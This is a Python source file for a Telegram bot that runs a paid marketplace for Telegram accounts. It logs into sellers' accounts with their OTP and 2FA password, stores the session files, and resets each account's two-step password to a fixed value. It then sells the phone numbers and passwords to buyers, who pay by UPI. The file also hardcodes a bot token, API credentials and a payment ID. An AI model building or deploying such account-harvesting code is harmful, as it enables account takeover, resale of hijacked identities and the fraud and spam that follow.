import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio
import os
import threading
from flask import Flask

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "PRIME MASTER BOT LIVE"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488
LOG_CHANNEL = -1002364843054
CHANNELS = [-1003901746920, -1003897524032]

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def check_join(uid):
    for cid in CHANNELS:
        try:
            m = bot.get_chat_member(cid, uid)
            if m.status in ['left', 'kicked', 'restricted']: return False
        except: return False
    return True

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START & FORCE JOIN ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    if not check_join(uid):
        markup = types.InlineKeyboardMarkup()
        # EXACT CHANNELS FIXED HERE
        markup.add(types.InlineKeyboardButton("📢 PRIME OTP SUPPORT", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
        markup.add(types.InlineKeyboardButton("📢 TEAM QUORUM", url="https://t.me/Team_quorum"))
        markup.add(types.InlineKeyboardButton("✅ CHECK JOIN", callback_data="check_joined"))
        return bot.send_message(message.chat.id, "⚠️ **ACCESS DENIED!**\n\nPlease join both channels to use the bot.", reply_markup=markup)
    bot.send_message(message.chat.id, "🔥 **PRIME OTP BOT READY**", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def check_cb(call):
    if check_join(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ Access Granted!", reply_markup=main_menu())
    else: bot.answer_callback_query(call.id, "❌ Join both channels first!", show_alert=True)

# --- NEW: ADD COUNTRY LOGIC ---
@bot.message_handler(commands=['addcountry'])
def add_country_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        # Format: /addcountry INDIA 40 25 (Buy 40, Sell 25)
        cmd = message.text.split()
        c = cmd[1].upper()
        b_price = int(cmd[2])
        s_price = int(cmd[3])
        
        db['buy_rates'][c] = b_price
        db['sell_rates'][c] = s_price
        if c not in db['stock']: db['stock'][c] = []
            
        bot.reply_to(message, f"✅ **Country Added!**\n🌍 Name: {c}\n🛒 Buy Price: ₹{b_price}\n📤 Sell Price: ₹{s_price}")
    except:
        bot.reply_to(message, "❌ Use Format: `/addcountry COUNTRY BUY_PRICE SELL_PRICE`\nExample: `/addcountry INDIA 40 25`")

# --- ADMIN: ADD STOCK (LOGIN FLOW) ---
@bot.message_handler(commands=['addstock'])
def admin_add_stock(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "🌍 Enter Country (E.g. INDIA):")
    bot.register_next_step_handler(msg, stock_country_step)

def stock_country_step(message):
    country = message.text.upper()
    if country not in db['stock']:
        return bot.send_message(message.chat.id, "❌ Country not found! Please use `/addcountry` first.")
    
    msg = bot.send_message(message.chat.id, f"📞 Enter {country} Number (+...):")
    bot.register_next_step_handler(msg, start_stock_login, country)

def start_stock_login(message, country):
    phone = message.text.strip()
    threading.Thread(target=stock_login_thread, args=(message.chat.id, phone, country)).start()

def stock_login_thread(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
        bot.send_message(chat_id, "📩 **OTP SENT!** Admin, enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_stock_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_stock_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_stock_add(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 **2FA REQUIRED!** Admin, enter password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_stock_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Error.")

def verify_stock_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_stock_add(message, d, pwd)
    except: bot.send_message(message.chat.id, "❌ Wrong 2FA.")

def finalize_stock_add(message, d, pwd="No Password"):
    country = d['country']
    data = f"{d['phone']}:PASS:{pwd}"
    db['stock'][country].append(data)
    bot.send_message(message.chat.id, f"✅ **STOCK ADDED!**\nCountry: {country}\nData: `{data}`")

# --- DEPOSIT FLOW (STEP-BY-STEP) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 **Enter Amount to Deposit:**")
    bot.register_next_step_handler(msg, dep_utr_req)

def dep_utr_req(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 **Pay to:** `{db['upi']}`\n\nSend your **12-digit UTR Number** after payment:")
        bot.register_next_step_handler(msg, dep_screenshot_req, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid Amount. Start again.")

def dep_screenshot_req(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "❌ UTR must be 12 digits. Start again.")
    msg = bot.send_message(message.chat.id, "📸 Now send the **Payment Screenshot**:")
    bot.register_next_step_handler(msg, dep_final_process, amt, utr)

def dep_final_process(message, amt, utr):
    if message.content_type != 'photo': return bot.send_message(message.chat.id, "❌ Please send a Photo. Start again.")
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"), 
               types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}"))
    for a in db['admins']:
        bot.send_photo(a, message.photo[-1].file_id, caption=f"🔔 **DEP REQ**\nUser: `{uid}`\nAmt: ₹{amt}\nUTR: `{utr}`", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Request sent to Admin.")

# --- SELL SYSTEM (AUTO 2FA TO 2710) ---
@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_menu(message):
    if not db['sell_rates']: return bot.send_message(message.chat.id, "❌ Selling Disabled.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    markup.add("BACK")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_init(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"📞 Enter {country} Number (+...):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, start_sell_login, country)

def start_sell_login(message, country):
    phone = message.text.strip()
    threading.Thread(target=sell_login_thread, args=(message.chat.id, phone, country)).start()

def sell_login_thread(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
        bot.send_message(chat_id, "📩 **OTP SENT!** Enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_sell_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_sell_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_sell_process(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 **2FA DETECTED!** Enter password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_sell_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Error.")

def verify_sell_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_sell_process(message, d)
    except: bot.send_message(message.chat.id, "❌ Wrong 2FA.")

def finalize_sell_process(message, d):
    try:
        d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(
            new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob")
        )))
    except: pass
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}_{d['phone']}"))
    for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{uid}`\nNum: `{d['phone']}`\nNew 2FA: `2710`", reply_markup=markup)
    bot.send_message(message.chat.id, "✅ Login success! 2FA set to 2710. Wait for admin approval.")

# --- ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, 
        "👑 **ADMIN PANEL**\n\n"
        "🌍 `/addcountry INDIA 40 25` - Add Country & Prices\n"
        "➕ `/addstock` - Login & Add Number\n"
        "👤 `/addadmin ID` - Add New Admin\n"
        "📈 `/setbuy INDIA 40` - Update Buy Rate\n"
        "📉 `/setsell INDIA 25` - Update Sell Rate\n"
        "📜 `/list` - View Stock & Rates\n"
        "💳 `/changeupi ID` - Update Payment UPI")

@bot.message_handler(commands=['addadmin', 'setbuy', 'setsell', 'list', 'changeupi'])
def admin_cmds(message):
    if not is_admin(message.from_user.id): return
    cmd = message.text.split()
    try:
        if '/addadmin' in cmd[0]:
            db['admins'].append(int(cmd[1]))
            bot.reply_to(message, "✅ Admin Added.")
        elif '/setbuy' in cmd[0]:
            db['buy_rates'][cmd[1].upper()] = int(cmd[2])
            bot.reply_to(message, "✅ Buy Rate Updated.")
        elif '/setsell' in cmd[0]:
            db['sell_rates'][cmd[1].upper()] = int(cmd[2])
            bot.reply_to(message, "✅ Sell Rate Updated.")
        elif '/list' in cmd[0]:
            res = "📊 **SYSTEM STATUS**\n"
            for c in db['buy_rates']: 
                res += f"\n🌍 {c} | Buy: ₹{db['buy_rates'][c]} | Sell: ₹{db['sell_rates'].get(c, 0)} | Stock: {len(db['stock'].get(c, []))}"
            bot.send_message(message.chat.id, res if db['buy_rates'] else "No data.")
        elif '/changeupi' in cmd[0]:
            db['upi'] = cmd[1]
            bot.reply_to(message, "✅ UPI Updated.")
    except: bot.reply_to(message, "❌ Format error!")

# --- BUY & OTHER MENUS ---
@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_menu_m(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "❌ No stock available.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({len(db['stock'].get(c, []))} in stock)", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "Select country:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    p = call.data.split('_')
    if p[0] == 'da': # Deposit Approve
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added to balance!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'sa': # Sell Approve
        uid, country, phone = int(p[1]), p[2], p[3]
        rate = db['sell_rates'].get(country, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"✅ Sold! ₹{rate} added to balance.")
        bot.edit_message_text(f"Paid ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'buy': # Buy ID
        c, uid = p[1], call.from_user.id
        price = db['buy_rates'].get(c, 0)
        if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "Low Stock or Balance!", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= price
        bot.send_message(uid, f"🛒 **BUY SUCCESS!**\n\nHere is your ID Details:\n`{data}`")
        bot.answer_callback_query(call.id, "Check PM for ID details!")

@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def bal(message):
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 Balance: ₹{b}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def sup(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"),
               types.InlineKeyboardButton("📢 SUPPORT GROUP", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
    bot.send_message(message.chat.id, "🚩 Contact Support:", reply_markup=markup)

bot.polling(none_stop=True)
